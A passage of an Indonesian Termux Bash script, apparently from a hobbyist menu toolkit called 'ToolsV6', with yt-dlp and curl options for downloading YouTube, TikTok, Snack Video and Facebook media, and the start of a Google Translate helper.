⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠛⠿⠿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo ""
echo -e "${g}================================"
echo -e "${r}  Creator ${p}: ${c}Thxyzz404"
echo -e "${r}  Alat ${p}: ${c}Download Musik"
echo -e "${g}================================"
echo ""
read -p "$(echo -e "${y}Masukkan URL Yt ${r}[ ${g}URL ${r}]${n} : ")" yt
echo ""
if [[ -z "$yt" ]]; then
    echo -e "${r}[ ${g}!! ${r}]${c} Link Tidak Boleh Kosong..!!"
    sleep 2
fi
echo ""
echo -e "${r}[ ${g}+ ${r}]${g} Mendownload Musik Dan Mengonversi Ke ${r}[ ${c}MP3 ${r}]"
echo -e "${n}"
yt-dlp \
    --extract-audio \
    --audio-format mp3 \
    --audio-quality 0 \
    --output "${DIR}/%(title)s.%(ext)s" \
    "$yt"
if [[ $? -eq 0 ]]; then
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${g} Musik Berhasill Di Download Ke ${c}:${r} $DIR"
    sleep 4 
    echo ""
else
    echo ""
    echo -e "${r}[ ${g}!! ${r}] Gagall Mendownload Dari YouTube..!!"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "3" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
████████▀▀▀████
████████────▀██
████████──█▄──█
███▀▀▀██──█████
█▀──▄▄██──█████
█──█████──█████
█▄──▀▀▀──▄█████
███▄▄▄▄▄███████
" | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo ""
read -p "$(echo -e "${y}Masukkan URL TikTok ${r}[ ${g}URL ${r}]${n} : ")" url
target="/storage/emulated/0/Download"
if [ ! -d "$target" ]; then
  echo ""
  echo -e "${r}[ ${g}!! ${r}]${g} Folder Download Di SD Card Tidak Ditemukan..!!"
fi
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Mendownload Video Tiktok..!!"
echo -e "${n}"
yt-dlp -o "$target/%(title).50s.%(ext)s" "$url" --no-playlist || {
echo ""
echo -e "${r}[ ${g}!! ${r}]${y} Gagall Mendownload Video Tiktok. Periksa URL TikTok Anda..!!"
}
echo ""
echo -e "${r}[ ${g}✓ ${r}]${g} Video Berhasill Di Download Ke File ${c}:${r} $target"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "4" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠠⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡁⠄⢄⢐⠨⠙⢛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀
⠀⠀⠀⠅⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠡⠠⢁⢂⢐⠠⢁⠢⠈⠌⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀
⠀⠀⠌⢂⠡⢙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢂⢁⠂⠀⠀⠀⠀⠈⠌⠨⢐⠠⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀
⠀⠀⠅⡂⠌⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠅⡂⠄⠀⠀⠀⠀⠀⠀⠀⠈⠀⠂⠅⡊⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠨⢐⠠⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡐⣼⣿⣿⣿⣿⣿⣿⣿⣿⡧⠀
⠀⠈⠄⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠂⠄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠐⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀
⠀⠻⠿⠿⠿⠟⡛⡋⡋⠍⠩⢙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠐⢐⢀⠂⠌⠌⡐⡈⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠂⠌⠌⡐⠠⢂⠨⠙⠿⡿⡿⡿⡿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠐⡁⢂⠂⠅⡂⢂⠂⢌⠐⡀⡂⠌⡻⢿⣿⣿⣿⣿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐⠐⡠⢁⠂⠌⠄⢂⠡⠠⠁⠅⠁⠁⠀⠀" | lolcat 
echo ""
echo -e "${r}╔════════════════════════════════════════════╗"
echo -e "${r}║ ${g} 🚀 Snack Video Downloader For Termux 🚀   ${r}║"
echo -e "${r}╚════════════════════════════════════════════╝"
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${c}"
read -p "🔗 Masukkan URL Snack : " url
if [[ ! $url =~ ^https:\/\/s\.snackvideo\.com\/p\/.* ]]; then
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${p} URL tidak valid. Harus dimulai dengan : https://s.snackvideo.com/p/xxx"
    echo ""
fi
echo -e "${g}"
read -p "📁 Masukkan nama folder tujuan [ contoh : Download ] : " folder
output="/storage/emulated/0/$folder"
if [ ! -d "$output" ]; then
    mkdir -p "$output"
    if [ $? -ne 0 ]; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} Gagall membuat folder tujuan. Pastikan izin storage sudah diberikan."
        echo ""
    fi
fi
echo -e "${y}⏬ Mohon bersabar sedang mendownload : $output${n}"
yt-dlp "$url" -o "$output/%(title)s.%(ext)s"
if [ $? -ne 0 ]; then
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${p} Gagall mendownload video. Pastikan URL valid dan koneksi stabil."
    echo ""
fi
clear
echo ""
echo -e "${g}✅ Download selesai silakan cek folder anda di : $output"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "5" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
banner() {
    clear
    echo "
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠙⠿⠿⠛⠉⣠⣾⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⠟⠁⢀⣠⣄⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡇
⠈⣿⣿⣿⣿⣟⣥⣶⣾⣿⣿⣿⣷⣦⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀
⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
}
down() {
    echo -e "${p}Development ${c}: ${g}Thxyzz404"
    echo -e "${g}"
    read -p "Masukkan URL Facebook : " url
    echo -e "${r}"
    read -p "Masukkan tujuan [ contoh : /sdcard/Download ] : " folder
    if [[ -z "$url" || -z "$folder" ]]; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} URL atau folder tidak boleh kosong..!!"
        echo ""
    fi
    final=$(curl -Ls -o /dev/null -w "%{url_effective}" "$url")
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${g} Mendownload video dari Facebook..!!${n}"
    echo ""
    yt-dlp -o "$folder/%(title)s.%(ext)s" "$final"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Video berhasil didownload ke : $folder "
        echo ""
    else
        echo ""
        echo -e "${r} Gagall Mendownload Video..!!"
        echo ""
    fi
}
banner
down
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "6" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣷⠀⠀⢠⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⣠⣶⣦⡀⠹⣿⣿⣿⣿⡿⠁⠀⠘⣿⣿⣿⣿⣿⠇⣠⣴⣶⡄⠀
⢰⣿⣿⣿⣿⣆⠉⠛⠛⠋⠁⣀⣀⣀⠈⠛⠛⠛⠁⣼⣿⣿⣿⣿⡀
⢸⣿⣿⣿⣿⣿⡆⠀⢀⣴⣿⣿⣿⣿⣿⣦⠀⠀⢸⣿⣿⣿⣿⣿⡇
⠈⢿⣿⣿⣿⣿⠃⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢸⣿⣿⣿⣿⠟⠀
⠀⠀⠉⠙⠋⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠛⠋⠁⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⡿⠛⠁
" | lolcat
echo -e "${g}===============${r} TIKTOK ALL DOWN ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.tikwm.com"
echo ""
echo -e "${g} SELESAI MEMBUKA WATERMARK ALL URL LINK..!!"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "7" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
figlet Foto | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"
read -p "Masukkan URL foto : " url
echo -e "${c}"
read -p "Masukkan nama file [ contoh : gambar.png / foto.jpg ] : " cok
path="/sdcard/Download/$cok"
if [[ "$cok" =~ \.(png|jpg|jpeg)$ ]]; then
    echo ""
    echo -e "${g} Sedang Mendownload di : $url"
    curl -L -o "$path" "$url"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Foto berhasil disimpan di : $path"
    else
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Gagall mendownload..!!"
    fi
else
    clear 
    echo ""
    echo -e "${y} Format harus di awali ${g}foto.jpg foto.png foto.jpeg"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "8" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
figlet Video | lolcat 
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"
read -p "Masukkan URL video : " url
echo -e "${c}"
read -p "Masukkan nama file [ contoh : video.mp4 / film.mkv ] : " file
path="/sdcard/Download/$file"
if [[ "$file" =~ \.(mp4|mkv|webm|avi|mov)$ ]]; then
    echo ""
    echo -e "${g} Sedang mendownload video dari : $url"
    curl -L --progress-bar -o "$path" "$url"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Video berhasil disimpan di : $path"
    else
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Gagal mendownload..!!"
    fi
else
    clear 
    echo ""
    echo -e "${y} Format harus di awali ${g}video.mp4, video.mkv, video.webm, video.avi, atau video.mov"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ $dor == "9" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Down !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo " 
⠀⢀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀
⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣹⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀
⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠁" | lolcat
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"
read -r -e -p "Masukkan link Yt : " link
echo ""
if [ -z "$link" ]; then
    echo -e "${r}Error : Link YouTube tidak boleh kosong!"
    echo ""
fi
dir="/storage/emulated/0"
tmp=$(date +%Y%m%d_%H%M%S)
path="$dir/youtube_video_${tmp}.mp4"
echo -e "${c}Mengunduh video..!!"
yt-dlp -o "$path" "$link"
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${g}✅ Video YouTube berhasil diunduh"
    echo -e "${y}📁 Disimpan di : $path"
else
    echo ""
    echo -e "${r}❌ Gagal mengunduh video YouTube"
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$dor" == "bk" ]]; then
break
else
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Tidak_Ada.mp3" &> /dev/null &
echo -e "${bold_bg}${green} Menu Tidak Ada Di ToolsV6 ${n}"
sleep 6
clear
fi
done
}
tm_menu() {
while true; do
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "$w╔═════════════════════════════════════════════╗"
echo -e "$w║        ${bold_bg}${bold_gren}  ☣ MENU SCRIPT TAMBAHAN ☣  ${n}      $w   ║${n}"
echo -e "$w╠═════════════════════════════════════════════╣"
echo -e "$w║${r} [ ${g}1 ${r}] ${c}Google Translate                      $w║"
echo -e "$w║${r} [ ${g}2 ${r}] ${c}All-Game Via Web                      $w║"
echo -e "$w║${r} [ ${g}3 ${r}] ${c}Check Umur Seseorang                  $w║"
echo -e "$w║${r} [ ${g}4 ${r}] ${c}Kompres Foto                          $w║"
echo -e "$w║${r} [ ${g}5 ${r}] ${c}Generator teks sound google           $w║"
echo -e "$w║${r} [ ${g}6 ${r}] ${c}Perhitungan Kalkulator                $w║"
echo -e "$w║${r} [ ${g}7 ${r}] ${c}Kotak 4 tanpa newasision              $w║"
echo -e "$w║${r} [ ${g}8 ${r}] ${c}Generator Logo Ascci                  $w║"
echo -e "$w║${r} [ ${g}9 ${r}] ${c}Kalender Tools Termux                 $w║"
echo -e "$w║${p} [ ${r}bk ${p}] ${g}KEMBALI KE MENU AWAL                 $w║"
echo -e "$w╚═════════════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSV6 ${r}]${c} : ")" tm
echo ""
if [[ $tm == "1" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Tm !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
b='\033[1;34m'
g='\033[1;32m'
p='\033[1;35m'
c='\033[1;36m'
r='\033[1;31m'
y='\033[1;33m'
n='\033[0m'
[[ ! $(command -v jq) ]] && pkg install jq -y &>/dev/null
[[ ! $(command -v curl) ]] && pkg install curl -y &>/dev/null
declare -A nama_bahasa=(
    ["id"]="Indonesia" ["en"]="Inggris" ["ja"]="Jepang" ["ko"]="Korea" ["zh-CN"]="China" 
    ["fr"]="Prancis" ["es"]="Spanyol" ["de"]="Jerman" ["ar"]="Arab" ["hi"]="Hindi"
    ["pt"]="Portugis" ["ru"]="Rusia" ["it"]="Italia" ["th"]="Thailand" ["vi"]="Vietnam"
    ["tr"]="Turki" ["nl"]="Belanda" ["pl"]="Polandia" ["sv"]="Swedia" ["da"]="Denmark"
    ["fi"]="Finlandia" ["no"]="Norwegia" ["el"]="Yunani" ["he"]="Ibrani" ["fa"]="Persia"
    ["af"]="Afrikaans" ["sq"]="Albania" ["am"]="Amhar" ["hy"]="Armenia" ["az"]="Azerbaijan"
    ["eu"]="Basque" ["be"]="Belarusia" ["bn"]="Bengali" ["bs"]="Bosnia" ["bg"]="Bulgaria"
    ["ca"]="Katalan" ["ceb"]="Cebuano" ["ny"]="Chichewa" ["co"]="Korsika" ["hr"]="Kroasia"
    ["cs"]="Ceko" ["eo"]="Esperanto" ["et"]="Estonia" ["tl"]="Filipina" ["fy"]="Frisia"
    ["gl"]="Galisia" ["ka"]="Georgia" ["ht"]="Kreol Haiti" ["ha"]="Hausa" ["haw"]="Hawaii"
    ["iw"]="Ibrani" ["ig"]="Igbo" ["ga"]="Irlandia" ["jw"]="Jawa" ["kn"]="Kannada"
    ["kk"]="Kazakh" ["km"]="Kamboja" ["rw"]="Kinyarwanda" ["ku"]="Kurdi" ["ky"]="Kirgiz"
    ["lo"]="Laos" ["la"]="Latin" ["lv"]="Latvia" ["lt"]="Lituania" ["lb"]="Luksemburg"
    ["mk"]="Makedonia" ["mg"]="Malagasi" ["ms"]="Melayu" ["ml"]="Malayalam" ["mt"]="Malta"
    ["mi"]="Maori" ["mr"]="Marathi" ["mn"]="Mongolia" ["my"]="Myanmar" ["ne"]="Nepal"
    ["or"]="Odia" ["ps"]="Pashto" ["pa"]="Punjabi" ["ro"]="Rumania" ["sm"]="Samoa"
    ["gd"]="Skotlandia" ["sr"]="Serbia" ["st"]="Sotho" ["sn"]="Shona" ["sd"]="Sindhi"
    ["si"]="Sinhala" ["sk"]="Slowakia" ["sl"]="Slovenia" ["so"]="Somali" ["su"]="Sunda"
    ["sw"]="Swahili" ["tg"]="Tajik" ["ta"]="Tamil" ["tt"]="Tatar" ["te"]="Telugu"
    ["tk"]="Turkmen" ["uk"]="Ukraina" ["ur"]="Urdu" ["ug"]="Uighur" ["uz"]="Uzbek"
    ["cy"]="Welsh" ["xh"]="Xhosa" ["yi"]="Yiddi" ["yo"]="Yoruba" ["zu"]="Zulu"
)
terjemah() {
    local teks="$1"
    local dari="$2"
    local ke="$3"
    local enc=$(printf '%s' "$teks" | jq -s -R -r @uri)
    local url="https://translate.googleapis.com/translate_a/single?client=gtx&sl=$dari&tl=$ke&dt=t&q=$enc"
    local hasil=$(curl -s "$url" -A "Mozilla/5.0" --connect-timeout 8 --max-time 12)
    [[ -z "$hasil" || "$hasil" == "null" ]] && {
        echo -e "${r}Koneksi gagal, coba lagi..!!"
        sleep 2
        hasil=$(curl -s "$url" -A "Mozilla/5.0" --connect-timeout 8 --max-time 12) || {
            echo -e "${y}Gagal terhubung."
            return 1
        }
    }
    local terjemahan=$(echo "$hasil" | jq -r '.[0][0][0]' 2>/dev/null)
    [[ "$terjemahan" == "null" ]] && terjemahan="Tidak dapat menerjemahkan."
    local nama_dari="${nama_bahasa[$dari]:-$dari}"
    local nama_ke="${nama_bahasa[$ke]:-$ke}"
    echo -e "${b}[ ${r}$nama_dari → $nama_ke ${b}]"
    echo ""
    echo -e "${g}$terjemahan"
    echo -e "${p}──────────────────────────────────────────────"
    echo -e "${g}"
}
